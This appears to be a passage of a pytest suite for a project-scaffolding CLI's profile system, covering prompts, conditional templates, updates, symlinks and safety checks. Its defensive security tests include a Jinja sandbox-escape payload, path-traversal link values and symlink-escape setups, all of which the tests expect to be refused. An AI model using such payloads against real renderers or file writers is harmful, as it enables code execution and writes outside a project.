def test_answer_flag_errors_without_profile_or_with_bad_value(tmp_path: Path) -> None:
    assert cli.main(["demo", "-o", str(tmp_path / "p1"), "-y", "--no-git", "--answer", "x=1"]) == 2
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    args = ["demo", "-o", str(tmp_path / "p2"), "-y", "--no-git", "--profile", str(prof.root)]
    rc = cli.main([*args, "--answer", "tier=gold"])
    assert rc == 2


def test_when_false_skipped_select_lands_its_type_default(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": False, "select": "mysql"})
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {"name": "use_db", "type": "confirm", "message": "DB?"},
            {
                "name": "engine",
                "type": "select",
                "message": "Engine?",
                "choices": ["postgres", "mysql"],
                "when": "answers.use_db",
            },
        ],
    )
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {
        "use_db": False,
        "engine": "postgres",
    }  # skipped → first choice (type default)
    assert "Engine?" not in asked


def test_when_with_a_nested_undefined_reference_is_falsy_not_a_crash(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # `when` touches a not-yet-gathered key with nested access — must skip gracefully, not raise.
    _fake_questionary(monkeypatch, {"text": "v"})
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {
                "name": "x",
                "type": "text",
                "message": "X?",
                "when": "answers.later.deep",
                "default": "d",
            }
        ],
    )
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {"x": "d"}  # undefined chain → falsy → skipped → default


def test_load_rejects_a_bad_when_expression(tmp_path: Path) -> None:
    with pytest.raises(profiles.ProfileError, match="when"):  # not a string
        _load_prompts(tmp_path, [{"name": "x", "type": "text", "message": "m", "when": 1}])
    with pytest.raises(profiles.ProfileError, match="when"):  # syntax error
        _load_prompts(
            tmp_path, [{"name": "x", "type": "text", "message": "m", "when": "answers.("}]
        )


def test_default_answers_uses_declared_then_type_defaults(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {
                "name": "tier",
                "type": "select",
                "message": "?",
                "choices": ["a", "b"],
                "default": "b",
            },
            {"name": "db", "type": "confirm", "message": "?"},  # → False
            {"name": "svc", "type": "text", "message": "?"},  # → ""
            {"name": "sel", "type": "select", "message": "?", "choices": ["x", "y"]},  # → first
        ],
    )
    assert profiles.default_answers(prof) == {"tier": "b", "db": False, "svc": "", "sel": "x"}


def test_answers_render_in_templates_and_record_in_manifest(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/conf.md.j2": "tier={{ answers.tier }}\n"},
        prompts=[{"name": "tier", "type": "text", "message": "?", "default": "basic"}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"tier": "gold"})

    assert (target / "docs/conf.md").read_text(encoding="utf-8") == "tier=gold\n"
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["answers"] == {"tier": "gold"}


def test_conditional_j2_is_skipped_when_it_renders_empty(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"db/schema.sql.j2": "{% if answers.use_db %}schema\n{% endif %}"},
        prompts=[{"name": "use_db", "type": "confirm", "message": "?", "default": False}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)  # default use_db=False → empty → skipped

    assert not (target / "db/schema.sql").exists()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "db/schema.sql" not in m["profile"]["files"]  # not claimed as owned


def test_update_replays_recorded_answers_without_reprompting(tmp_path: Path) -> None:
    # use_db defaults False, but the project was scaffolded with True (a conditional file). A
    # bump must re-render with the RECORDED True (never re-prompt, never fall back to the default).
    prof = _make_profile(
        tmp_path,
        "team",
        {"db/schema.sql.j2": "{% if answers.use_db %}v1\n{% endif %}"},
        version="0.1.0",
        by_path=True,
        prompts=[{"name": "use_db", "type": "confirm", "message": "?", "default": False}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"use_db": True})
    assert (target / "db/schema.sql").read_text(encoding="utf-8") == "v1\n"
    _commit(target)

    _bump_profile(
        prof.root,
        version="0.1.1",
        files={"db/schema.sql.j2": "{% if answers.use_db %}v2\n{% endif %}"},
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "db/schema.sql").read_text(
        encoding="utf-8"
    ) == "v2\n"  # replayed True → refreshed
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["answers"] == {"use_db": True}


def test_update_removes_a_profile_file_that_now_renders_empty(tmp_path: Path) -> None:
    # §4 + orphan: a managed conditional file present at scaffold; a bump makes it render empty →
    # it's dropped from the owned set and orphan-removed on update (it was pristine).
    prof = _make_profile(
        tmp_path,
        "team",
        {"opt.md.j2": "{% if answers.keep %}content\n{% endif %}"},
        version="0.1.0",
        by_path=True,
        prompts=[{"name": "keep", "type": "confirm", "message": "?"}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"keep": True})
    assert (target / "opt.md").exists()
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"opt.md.j2": "{% if False %}x{% endif %}"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert not (target / "opt.md").exists()  # renders empty now → orphan-removed
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "opt.md" not in m["profile"].get("files", [])


def test_update_keeps_an_edited_file_that_now_renders_empty_as_a_conflict(tmp_path: Path) -> None:
    # The honest-cost case (RFC Consequences): a file that renders empty after a bump is dropped
    # if pristine — but if the user EDITED it, it must survive as a conflict, never silently lost.
    prof = _make_profile(
        tmp_path,
        "team",
        {"opt.md.j2": "{% if answers.keep %}content\n{% endif %}"},
        version="0.1.0",
        by_path=True,
        prompts=[{"name": "keep", "type": "confirm", "message": "?"}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"keep": True})
    (target / "opt.md").write_text("my own edit\n", encoding="utf-8")  # the user edits it
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"opt.md.j2": "{% if False %}x{% endif %}"})
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert (target / "opt.md").read_text(encoding="utf-8") == "my own edit\n"  # NOT lost
    assert "opt.md" in console.text  # surfaced as a conflict instead of removed


# --- env namespace (environment facts for templates / when) ---------------------------------


def test_env_namespace_renders_environment_facts(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    config.existing_project = True
    config.detected_languages = ["go", "python"]
    tmpl = "ex={{ env.existing_project }} det={{ env.detected_languages | join(',') }}\n"
    prof = _make_profile(tmp_path, "team", {"docs/e.md.j2": tmpl})
    cli.build(config, Scaffolder(target), prof)
    assert (target / "docs/e.md").read_text(encoding="utf-8") == "ex=True det=go,python\n"


def test_env_drives_conditional_file_inclusion(tmp_path: Path) -> None:
    files = {"MIGRATING.md.j2": "{% if env.existing_project %}migrate\n{% endif %}"}
    # brownfield → included
    brown = tmp_path / "brown"
    brown.mkdir()
    cfg = _config(brown)
    cfg.existing_project = True
    cli.build(cfg, Scaffolder(brown), _make_profile(tmp_path / "a", "team", files))
    assert (brown / "MIGRATING.md").exists()
    # fresh → skipped (renders empty)
    fresh = tmp_path / "fresh"
    fresh.mkdir()
    cli.build(_config(fresh), Scaffolder(fresh), _make_profile(tmp_path / "b", "team", files))
    assert not (fresh / "MIGRATING.md").exists()


def test_prompt_when_can_reference_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": True})
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {
                "name": "migrate",
                "type": "confirm",
                "message": "Migrate?",
                "when": "env.existing_project",
            }
        ],
    )
    config = _config(tmp_path / "x")  # existing_project defaults False
    answers = profiles.gather_answers(prof, config, interactive=True)
    assert answers == {"migrate": False} and "Migrate?" not in asked  # skipped on a fresh repo


def test_env_is_recorded_and_replayed_on_update(tmp_path: Path) -> None:
    # env must survive update (recorded in the manifest config snapshot), or a brownfield-only
    # file would be dropped on the next update when re-detection defaults existing_project False.
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    config.existing_project = True
    prof = _make_profile(
        tmp_path,
        "team",
        {"MIGRATING.md.j2": "{% if env.existing_project %}migrate v1\n{% endif %}"},
        version="0.1.0",
        by_path=True,
    )
    cli.build(config, Scaffolder(target), prof)
    assert (target / "MIGRATING.md").exists()
    _commit(target)

    _bump_profile(
        prof.root,
        version="0.1.1",
        files={"MIGRATING.md.j2": "{% if env.existing_project %}migrate v2\n{% endif %}"},
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "MIGRATING.md").read_text(
        encoding="utf-8"
    ) == "migrate v2\n"  # env replayed → kept


def test_update_tolerates_a_manifest_without_detected_languages(tmp_path: Path) -> None:
    # Backward compat: a project scaffolded before `env` (no detected_languages in the snapshot)
    # must still update — the field defaults to [].
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(
        tmp_path, "team", {"docs/x.md.j2": "langs={{ env.detected_languages }}\n"}, by_path=True
    )
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    m["config"].pop("detected_languages", None)  # simulate a pre-feature manifest
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2) + "\n", encoding="utf-8")
    _commit(target)

    assert update.run(target, dry_run=False, console=_Console()) == 0  # no crash
    assert (target / "docs/x.md").read_text(encoding="utf-8") == "langs=[]\n"  # defaulted to []


# --- standalone (extends: null) -------------------------------------------------------------


def test_standalone_profile_skips_the_default(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "# our contract\n", "x.md": "x\n"},
        extends=None,
    )
    assert prof.standalone
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    # The profile's own files are written…
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "# our contract\n"
    assert (target / "x.md").exists()
    # …and NONE of the default generators ran.
    for default_path in ("INSTRUCTION.md", ".claude/agents/code-reviewer.md", ".editorconfig"):
        assert not (target / default_path).exists()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["extends"] is None
    assert set(m["files"]) == {"AGENTS.md", "x.md"}  # only the profile's files


def test_standalone_profile_emits_onboarding_and_session_start(tmp_path: Path) -> None:
    # A standalone profile skips the default content but still gets its startup contributions:
    # a profile-only ONBOARDING.md (no default toolchain steps) and a minimal hooks settings.json.
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "# c\n"},
        extends=None,
        onboarding=("Recreate the symlinks: `ln -s AGENTS.md CLAUDE.md`",),
        session_start=("echo hi",),
    )
    target = tmp_path / "proj"
    rc = cli.main(["demo", "-o", str(target), "-y", "--no-git", "--profile", str(prof.root)])
    assert rc == 0
    onboarding = (target / "ONBOARDING.md").read_text(encoding="utf-8")
    assert "ln -s AGENTS.md CLAUDE.md" in onboarding  # the profile's own step
    assert "Commit the scaffold" not in onboarding  # no default toolchain/baseline flow
    settings = json.loads((target / ".claude/settings.json").read_text(encoding="utf-8"))
    cmds = [h["command"] for h in settings["hooks"]["SessionStart"][0]["hooks"]]
    assert cmds[-1] == "{ echo hi ; } || true"  # the profile's guarded hook
    assert any("update --check" in c for c in cmds)  # standalone still gets the version nudge


def test_update_a_standalone_project_refreshes_only_profile_files(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path, "team", {"AGENTS.md": "v1\n"}, version="0.1.0", extends=None, by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"AGENTS.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "v2\n"  # profile file refreshed
    assert not (target / "INSTRUCTION.md").exists()  # default still not generated


def test_degraded_update_of_a_standalone_project_does_not_regenerate_the_default(
    tmp_path: Path,
) -> None:
    # Regression: when a standalone profile's source is gone at update time, the recorded
    # `extends: null` must be honored — the project must NOT regenerate the whole default scaffold.
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "v1\n"}, extends=None, by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    shutil.rmtree(prof.root)  # profile source gone → degraded
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "v1\n"  # frozen, kept
    assert not (target / "INSTRUCTION.md").exists()  # default NOT leaked in
    assert not (target / ".claude").exists()


# --- safety: derived classifier, sandbox, path confinement, update re-gate ------------------


def test_classify_safety_declarative_is_safe(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path, "d", {"docs/notes.md.j2": "{{ project_name }}\n", "x.txt": "hi\n"}
    )
    assert profiles.classify_safety(prof) == ("safe", [])


def test_classify_safety_hooks_sinks_and_unknown_are_unsafe(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "u",
        {".github/workflows/ci.yml": "on: push\n", "weird.xyz": "x\n"},
        session_start=("echo hi",),
        onboarding=("do it",),
    )
    tier, reasons = profiles.classify_safety(prof)
    assert tier == "unsafe"
    assert any("session_start" in r for r in reasons)
    assert any("onboarding" in r for r in reasons)
    assert any("execution sink" in r and "ci.yml" in r for r in reasons)
    assert any("not-provably-inert" in r and "weird.xyz" in r for r in reasons)  # fail-closed


def test_manifest_records_the_derived_safety_tier(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(tmp_path, "u", {"Makefile": "all:\n\techo hi\n"})  # a sink → unsafe
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["safety"] == "unsafe"


def test_sandboxed_render_blocks_python_escape() -> None:
    # a hostile profile template can't reach Python internals to execute code
    assert render("{{ ''.__class__ }}").strip() == ""  # attribute denied → Undefined, no leak
    with pytest.raises(Exception):  # noqa: B017 - the escape chain raises SecurityError
        render("{{ ''.__class__.__mro__[1].__subclasses__() }}")


def test_apply_refuses_an_output_path_that_escapes_the_target(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    target = tmp_path / "proj"
    target.mkdir()
    (target / "sub").symlink_to(outside)  # a symlink in the target that points outside it
    prof = _make_profile(
        tmp_path, "evil", {"sub/evil.md": "x\n"}
    )  # would write through the symlink
    with pytest.raises(profiles.ProfileError, match="escapes"):
        profiles.apply(prof, _config(target), Scaffolder(target), {})


def test_update_gates_a_safe_to_unsafe_flip(tmp_path: Path) -> None:
    # A profile that flips safe → unsafe via something the hook-check misses (a new sink file)
    # still requires confirmation — new code the user hasn't consented to.
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(tmp_path, "team", {"docs/x.md": "v1\n"}, version="0.1.0", by_path=True)
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)
    assert profiles.classify_safety(prof) == ("safe", [])  # only a .md → safe

    _bump_profile(prof.root, version="0.1.1", files={"Makefile": "all:\n\techo hi\n"})  # → unsafe
    # --dry-run must disclose the flip (the gate message points the user here to review).
    dry = _Console()
    assert update.run(target, dry_run=True, console=dry) == 0
    assert "unsafe" in dry.text
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 2  # blocked without --yes
    assert "unsafe" in console.text
    assert update.run(target, dry_run=False, console=_Console(), assume_yes=True) == 0  # consented


def test_update_does_not_spuriously_gate_a_pre_safety_manifest(tmp_path: Path) -> None:
    # A project scaffolded before the safety tier was recorded (no `safety` key) must not get a
    # spurious safe → unsafe prompt just because the current profile is unsafe.
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(
        tmp_path, "team", {"Makefile": "all:\n\techo hi\n"}, version="0.1.0", by_path=True
    )  # already unsafe
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    m["profile"].pop("safety", None)  # simulate a pre-feature manifest
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2) + "\n", encoding="utf-8")
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"Makefile": "all:\n\techo v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0  # no spurious safety gate


# --- authoring CLI --------------------------------------------------------------------------


def test_profile_init_scaffolds_a_skeleton(tmp_path: Path) -> None:
    assert cli.main(["profile", "init", "myteam", "-o", str(tmp_path)]) == 0
    root = tmp_path / "myteam"
    manifest = json.loads((root / "profile.json").read_text(encoding="utf-8"))
    assert manifest["name"] == "myteam" and manifest["extends"] == "default"
    assert (root / "templates").is_dir() and (root / "README.md").exists()
    # An agent contract for *building* the profile ships at the root (meta, never shipped).
    assert (root / "AGENTS.md").exists() and not (root / "templates" / "AGENTS.md").exists()
    # It's immediately loadable as a (empty) profile.
    assert profiles.load(root).name == "myteam"
    # Re-running onto an existing dir refuses rather than clobbering.
    assert cli.main(["profile", "init", "myteam", "-o", str(tmp_path)]) == 2


def test_init_harness_files_are_meta_never_scaffolded(tmp_path: Path) -> None:
    # The root-level harness (AGENTS.md/README.md) guides the author; it's not part of the
    # profile — only files under templates/ are — so a scaffold never ships it.
    assert cli.main(["profile", "init", "team", "-o", str(tmp_path)]) == 0
    prof = profiles.load(tmp_path / "team")
    shipped = [rel for rel, _ in prof.template_files()]
    assert "AGENTS.md" not in shipped and "README.md" not in shipped  # harness is meta
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "AGENTS.md" not in m["profile"]["files"]  # not owned by the profile
    assert "README.md" not in m["profile"]["files"]


def test_profile_init_standalone_writes_extends_null(tmp_path: Path) -> None:
    assert cli.main(["profile", "init", "solo", "-o", str(tmp_path), "--standalone"]) == 0
    root = tmp_path / "solo"
    assert json.loads((root / "profile.json").read_text(encoding="utf-8"))["extends"] is None
    assert profiles.load(root).standalone
    assert "standalone" in (root / "README.md").read_text(encoding="utf-8").lower()


def test_profile_validate_accepts_a_good_profile(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/x.md.j2": "hi {{ project_name }}\n"})
    assert cli.main(["profile", "validate", str(prof.root)]) == 0


def test_profile_validate_flags_a_broken_template(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    prof = _make_profile(tmp_path, "team", {"bad.md.j2": "{% if oops %}\n"})  # unclosed if
    assert cli.main(["profile", "validate", str(prof.root)]) == 1
    assert "bad.md" in capsys.readouterr().out  # names the offending template


def test_profile_validate_flags_an_undefined_variable_typo(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # Strict rendering catches a typo'd variable that normal scaffolding would leave blank.
    prof = _make_profile(tmp_path, "team", {"x.md.j2": "hi {{ projetc_name }}\n"})
    assert cli.main(["profile", "validate", str(prof.root)]) == 1
    assert "x.md" in capsys.readouterr().out


def test_profile_validate_flags_a_seed_entry_with_no_file(tmp_path: Path) -> None:
    # `seed` names a path the profile doesn't actually ship → likely a typo, caught before a
    # consumer ever scaffolds with it.
    prof = _make_profile(tmp_path, "team", {"real.md": "x\n"}, seed=("ghost.md",))
    assert cli.main(["profile", "validate", str(prof.root)]) == 1


def test_profile_list_reports_user_dir(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr(profiles, "USER_PROFILE_DIR", tmp_path / "profiles")
    assert cli.main(["profile", "list"]) == 0
    assert "No profiles" in capsys.readouterr().out
    _make_profile(tmp_path / "profiles", "team", {"docs/x.md": "hi\n"})
    assert cli.main(["profile", "list"]) == 0
    assert "team" in capsys.readouterr().out


def test_profile_list_shows_the_safety_tier(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr(profiles, "USER_PROFILE_DIR", tmp_path / "profiles")
    _make_profile(tmp_path / "profiles", "safeone", {"docs/x.md": "hi\n"})  # inert → safe
    _make_profile(
        tmp_path / "profiles", "unsafeone", {"Makefile": "all:\n\techo\n"}
    )  # sink → unsafe
    assert cli.main(["profile", "list"]) == 0
    out = capsys.readouterr().out
    assert "· safe" in out and "· unsafe" in out


def test_profile_show_inspects_without_applying(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    prof = _make_profile(
        tmp_path, "team", {".github/workflows/ci.yml": "on: push\n"}, session_start=("echo hi",)
    )
    assert cli.main(["profile", "show", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert "team" in out and "unsafe" in out  # name + derived tier
    assert "ci.yml" in out and "echo hi" in out  # files + the hook it would run


def test_profile_show_escapes_untrusted_markup(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    d = tmp_path / "evil"
    (d / "templates").mkdir(parents=True)
    (d / "profile.json").write_text(
        json.dumps(
            {
                "name": "evil",
                "version": "[bold]0wned[/]",  # version is untrusted remote data too
                "extends": "default",
                "description": "[green]VERIFIED[/]",
            }
        ),
        encoding="utf-8",
    )
    (d / "templates/x.md").write_text("hi\n", encoding="utf-8")
    assert cli.main(["profile", "show", str(d)]) == 0
    out = capsys.readouterr().out
    assert "[green]VERIFIED[/]" in out and "[bold]0wned[/]" in out  # both escaped, not styled away


def test_profile_show_default_and_missing(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert cli.main(["profile", "show", "default"]) == 0
    assert "built-in" in capsys.readouterr().out
    assert cli.main(["profile", "show", str(tmp_path / "nope")]) == 2


def test_load_reads_and_validates_tags(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/x.md": "hi\n"}, tags=("backend", "python"))
    assert prof.tags == ("backend", "python")
    bad = tmp_path / "bad"
    (bad / "templates").mkdir(parents=True)
    (bad / "profile.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "extends": "default", "tags": "notalist"}),
        encoding="utf-8",
    )
    with pytest.raises(profiles.ProfileError, match="tags"):
        profiles.load(bad)


def test_show_and_publish_surface_tags(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/x.md": "hi\n"}, tags=("backend", "design"))
    assert cli.main(["profile", "show", str(prof.root)]) == 0
    assert "backend, design" in capsys.readouterr().out  # show displays them
    assert cli.main(["profile", "publish", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert '"tags"' in out and '"backend"' in out  # publish carries them into the index entry


def test_scaffold_with_unknown_profile_exits_2(tmp_path: Path) -> None:
    rc = cli.main(["demo", "-o", str(tmp_path / "out"), "-y", "--no-git", "--profile", "nope"])
    assert rc == 2
    assert not (tmp_path / "out" / "AGENTS.md").exists()  # nothing scaffolded on a bad profile


# --- links + @DATE@ (RFC 2026-07-05 §6) --------------------------------------------------------


def test_load_validates_links(tmp_path: Path) -> None:
    d = tmp_path / "p"
    (d / "templates").mkdir(parents=True)

    def manifest(links: object) -> None:
        (d / "profile.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "extends": "default", "links": links}),
            encoding="utf-8",
        )

    for bad in (["a"], {"a": 1}, {"": "x"}, {"a": ""}):
        manifest(bad)
        with pytest.raises(profiles.ProfileError, match="links"):
            profiles.load(d)
    for escaping in ({"../out": "AGENTS.md"}, {"CLAUDE.md": "../../etc"}, {"/abs": "x"}):
        manifest(escaping)
        with pytest.raises(profiles.ProfileError, match="inside the project"):
            profiles.load(d)
    manifest({"CLAUDE.md": "AGENTS.md", "GEMINI.md": "AGENTS.md"})
    prof = profiles.load(d)
    assert prof.links == (("CLAUDE.md", "AGENTS.md", None), ("GEMINI.md", "AGENTS.md", None))
    # Object form carries a `when`; a bad expression fails at load, not mid-apply.
    manifest({"CLAUDE.md": {"target": "AGENTS.md", "when": '"claude" in answers.tools'}})
    prof = profiles.load(d)
    assert prof.links == (("CLAUDE.md", "AGENTS.md", '"claude" in answers.tools'),)
    manifest({"CLAUDE.md": {"target": "AGENTS.md", "when": "{% bad"}})
    with pytest.raises(profiles.ProfileError, match="not a valid expression"):
        profiles.load(d)
    manifest({"CLAUDE.md": {"when": "x"}})  # object form still requires a target
    with pytest.raises(profiles.ProfileError, match="links"):
        profiles.load(d)


def test_links_are_created_owned_and_classified(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"NOTES.md": "hi\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"NOTES-LINK.md": "NOTES.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")

    tier, reasons = profiles.classify_safety(prof)
    assert tier == "unsafe" and any("symlink" in r for r in reasons)  # fail-closed

    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    link = target / "NOTES-LINK.md"
    assert link.is_symlink() and link.resolve() == (target / "NOTES.md").resolve()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "NOTES-LINK.md" in m["profile"]["files"]  # the link is an owned output
    assert m["files"]["NOTES-LINK.md"].startswith("symlink:")  # same provenance as base links

    import argparse

    shown = _Console()
    assert profiles._show(argparse.Namespace(ref=str(prof.root)), shown) == 0
    assert "NOTES-LINK.md -> NOTES.md" in shown.text


def test_link_through_symlinked_parent_is_refused(tmp_path: Path) -> None:
    # Confinement: a symlink dir already in the target must not let a link land outside.
    prof = _make_profile(tmp_path, "team", {})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"sub/evil.md": "sub/x.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    target = tmp_path / "proj"
    target.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (target / "sub").symlink_to(outside)
    with pytest.raises(profiles.ProfileError, match="escapes the project"):
        profiles.apply(prof, _config(target), Scaffolder(target), {})


def test_date_token_substitutes_and_replays_on_update(tmp_path: Path) -> None:
    from datetime import date

    prof = _make_profile(
        tmp_path, "team", {"docs/@DATE@-note.md": "v1\n"}, version="0.1.0", by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    today = f"{date.today():%Y-%m-%d}"
    dated = target / "docs" / f"{today}-note.md"
    assert dated.read_text(encoding="utf-8") == "v1\n"
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["date"] == today
    _commit(target)

    # Simulate the recorded date being older than "today" at update time: rewrite it and move
    # the file — update must replay the RECORDED stamp, not restamp with its own today.
    old_day = "2020-01-01"
    m["profile"]["date"] = old_day
    m["profile"]["files"] = [f"docs/{old_day}-note.md"]
    m["files"][f"docs/{old_day}-note.md"] = m["files"].pop(f"docs/{today}-note.md")
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2), encoding="utf-8")
    dated.rename(target / "docs" / f"{old_day}-note.md")
    _commit(target)

    _bump_profile(prof.root, version="0.1.2", files={"docs/@DATE@-note.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "docs" / f"{old_day}-note.md").read_text(encoding="utf-8") == "v2\n"
    assert not (target / "docs" / f"{today}-note.md").exists()  # no drift, no duplicate
    m2 = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m2["profile"]["date"] == old_day  # the stamp survives the refresh


def test_no_date_key_recorded_when_token_unused(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/plain.md": "x\n"})
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "date" not in m["profile"]


def test_link_target_resolving_outside_is_refused(tmp_path: Path) -> None:
    # Dest-side confinement: a link TARGET that chains through a user's outward symlink would
    # alias project reads/writes to outside — refused before creation.
    prof = _make_profile(tmp_path, "team", {})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": "AGENTS.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    target = tmp_path / "proj"
    target.mkdir()
    outside = tmp_path / "outside.md"
    outside.write_text("secrets\n", encoding="utf-8")
    (target / "AGENTS.md").symlink_to(outside)  # user's own outward link at the dest
    with pytest.raises(profiles.ProfileError, match="escapes the project"):
        profiles.apply(prof, _config(target), Scaffolder(target), {})


def test_link_never_clobbers_a_preexisting_user_file(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "contract\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": "AGENTS.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    target = tmp_path / "proj"
    target.mkdir()
    (target / "CLAUDE.md").write_text("the user's own file\n", encoding="utf-8")
    owned = profiles.apply(prof, _config(target), Scaffolder(target), {})
